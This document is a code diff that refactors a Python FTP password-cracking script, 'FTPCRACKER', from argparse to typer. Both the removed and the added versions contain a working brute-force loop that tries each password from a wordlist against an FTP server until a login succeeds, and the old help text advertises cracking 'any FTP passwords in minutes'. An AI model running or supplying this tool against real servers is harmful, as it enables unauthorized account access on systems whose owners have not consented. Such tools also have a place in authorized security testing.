@@ -1,69 +1,54 @@
 #!/usr/bin/env python3
 
-import os
 import sys
-import argparse
 import ftplib
+import typer
 
-parser = argparse.ArgumentParser()
-parser.add_argument('-s', help='specify server IP', dest='server')
-parser.add_argument('-u', help='specify user', dest='user')
-parser.add_argument('-p', help='specify password file', dest='passfile')
-args = parser.parse_args()
+VERSION = 'v1.1'
 
-server = args.server
-user = args.user
-passfile = args.passfile
-
-def crack(server, user, passfile):
-	while True:
-		try:
-			pass_file = open(passfile)
-			pass_file.close()
-		except:
-			print ("Password file does not found.")
-			quit('')
-				
-		pass_file = open(passfile)
-		for password in pass_file:
-			try:
-				print ("\033[32mtrying:", password)
-				password = password.strip()
-				ftp = ftplib.FTP(server)
-				if ftp.login(user, password):
-					print ("\033[1;32mPassword found:", password)
-					quit('')
-					break
-			except Exception as error:
-				print ('\033[31m530 Login incorrect')
-		pass_file.close()
-
-def clear():
-	os.system("clear")
-
-def help():
-	print("Crack any FTP passwords in minutes")
-	print('''usage: crack.py [-h] [-s SERVER] [-u USER] [-p PASSFILE]
-
-optional arguments:
-  -h, --help   show this help message and exit
-  -s SERVER    specify server IP
-  -u USER      specify user
-  -p PASSFILE  specify password file
-	''')
-def banner():
-	print('''\033[1;36m ______ _______ _____   _____ _____            _____ _  ________ _____  
+LOGO = '''
+ ______ _______ _____   _____ _____            _____ _  ________ _____  
 |  ____|__   __|  __ \ / ____|  __ \     /\   / ____| |/ /  ____|  __ \ 
 | |__     | |  | |__) | |    | |__) |   /  \ | |    | ' /| |__  | |__) |
 |  __|    | |  |  ___/| |    |  _  /   / /\ \| |    |  < |  __| |  _  / 
 | |       | |  | |    | |____| | \ \  / ____ \ |____| . \| |____| | \ \ 
-|_|       |_|  |_|     \_____|_|  \_\/_/    \_\_____|_|\_\______|_|  \_\ v1.0\033[0m
-		  \033[1;34mCreated by @CyberVarun (https://github.com/CyberVarun)\033[0m
-''')
+|_|       |_|  |_|     \_____|_|  \_\/_/    \_\_____|_|\_\______|_|  \_\ '''
 
-clear()
-banner()
-crack(server, user, passfile)
+CREDITS = '		  \033[1;34mCreated by @CyberVarun (https://github.com/CyberVarun)\033[0m'
 
-if sys.argv[0] == "-h":
-	help()
+
+def crack(server, user, passfile):
+	"""
+	# TODO: write docstring
+	"""
+	for password in passfile:
+		try:
+			password = password.strip()
+			typer.secho(f"trying: {password}", fg=typer.colors.GREEN)
+
+			ftp = ftplib.FTP(server)
+			if ftp.login(user, password):
+				typer.secho(f"Password Found: {password}", fg=typer.colors.BRIGHT_GREEN)
+				exit() # TODO: use typer.Exit() or typer.Abort() to exit
+
+		except Exception as e:
+			# TODO: handle connection not established
+			typer.secho(f"Login Incorrect", fg=typer.colors.RED)
+
+def main(
+	server: str = typer.Option(..., '--server', '-s', help="Specify Server IP"),
+	user: str = typer.Option(..., '--user', '-u', help="Specify User"),
+	passfile: typer.FileText = typer.Option(..., '--passfile', '-p', help="Specify Password File"),
+):
+	"""
+	Some desc
+	"""
+	typer.clear()  # clear the screen 
+	# print logo and cretids
+	typer.secho(LOGO + VERSION, fg=typer.colors.BRIGHT_CYAN)
+	typer.echo(CREDITS)  
+
+	crack(server, user, passfile)
+
+if __name__ == '__main__':
+	typer.run(main)
